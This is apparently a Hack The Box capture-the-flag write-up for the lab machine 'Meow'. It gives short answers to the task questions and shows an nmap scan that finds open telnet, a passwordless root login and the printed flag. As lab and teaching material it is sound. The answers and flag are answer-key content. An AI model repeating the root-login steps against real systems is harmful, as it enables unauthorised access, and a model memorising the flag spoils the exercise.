# Meow

> What does the acronym VM stand for? 

#### Virtual Machine 

---

> What tool do we use to interact with the operating system in order to start our VPN connection? 

#### terminal 

---

> What service do we use to form our VPN connection? 

#### openvpn 

---

> What is the abreviated name for a tunnel interface in the output of your VPN boot-up sequence output? 

#### tun 

---

> What tool do we use to test our connection to the target? 

#### ping 

---

> What is the name of the script we use to scan the target's ports? 

#### nmap 

---

> What service do we identify on port 23/tcp during our scans? 

#### telnet 

---

> What username ultimately works with the remote management login prompt for the target? 

#### root 

---

> Submit root flag 

We don't know anything about the host, so let's start with scan all the ports

```console
$ nmap -sV 10.129.137.161
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-28 00:08 CEST
Nmap scan report for 10.129.137.161
Host is up (0.21s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can connect to the machine using `telnet`

```console
$ telnet 10.129.137.161
Trying 10.129.137.161...
Connected to 10.129.137.161.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

```

The machines ask for a username...maybe `root`?

```console
Meow login: root
```

We now have access to `bash`, let's print the flag

```console
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

#### HTB{b40abdfe23665f766f9c61ecba8a4c19}